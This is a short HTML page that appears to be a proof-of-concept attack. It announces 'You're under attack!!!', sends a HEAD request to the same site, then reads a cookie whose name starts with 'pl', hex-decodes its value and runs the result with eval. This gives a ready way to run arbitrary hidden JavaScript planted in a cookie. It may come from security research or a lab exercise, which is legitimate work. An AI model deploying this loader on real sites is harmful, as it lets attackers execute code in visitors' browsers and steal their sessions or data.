<html>
    <head></head>
    <body>
        You're under attack!!!
        <script>

            //https://jsfiddle.net/Guffa/uT2q5/
            function hex2a(hex) {
                            var str = '';
                            for (var i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                            return str;
                        }

            //https://stackoverflow.com/questions/21722144/how-to-get-only-response-headers-from-xmlhttprequest
            var xhr = new XMLHttpRequest();
            var method = 'head';
            var url = '/';
            xhr.open(method,url,true);
            xhr.send(null);

            xhr.onreadystatechange = function()
            {
                            if (xhr.readyState === 4)
                            {
                                            const payload = document.cookie
                                                .split('; ')
                                                .find(row => row.startsWith('pl'))
                                                .split('=')[1];
                                            eval(hex2a(payload))
                                        }
                        }


        </script>
    </body>
</html>
